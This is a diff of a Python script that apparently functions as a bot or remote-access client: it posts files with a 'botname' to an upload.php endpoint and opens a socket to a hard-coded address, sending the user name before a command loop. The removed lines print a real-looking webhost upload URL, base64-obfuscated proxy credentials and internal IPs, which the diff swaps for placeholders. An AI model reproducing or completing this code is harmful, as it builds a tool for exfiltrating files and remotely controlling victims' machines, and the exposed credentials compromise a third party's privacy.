@@ -14,10 +14,10 @@ import json
 from datetime import datetime
 import requests
 
-uploadURL = 'http://monohydric-variatio.000webhostapp.com/upload.php'
+uploadURL = '<Your Host>/upload.php'
 identification = {}
 botname = ''
-proxy = {'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"}
+proxy = {'http': "http://username:password@proxyserveraddress:port"}
 
 
 def transfer(s, path):
@@ -70,8 +70,7 @@ def sendPost(Url, data, files=None):
 
 def sendFile(files=None):
     try:
-        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies={
-        'http': "http://" + b64decode("cml0MjAxNTA0NA==") + ":" + b64decode("SWlpdGEwNDQ=") + "@172.31.1.6:8080"})
+        response = requests.post(uploadURL, data={'botname': botname}, files=files, proxies=proxy)
     except Exception as e:
         return str(e)
     return response
@@ -169,7 +168,7 @@ initialize()
 
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('172.26.47.11', 1996))
+    s.connect(('internal IP', <Port No>))
     s.send(getuser())
 
     while True:
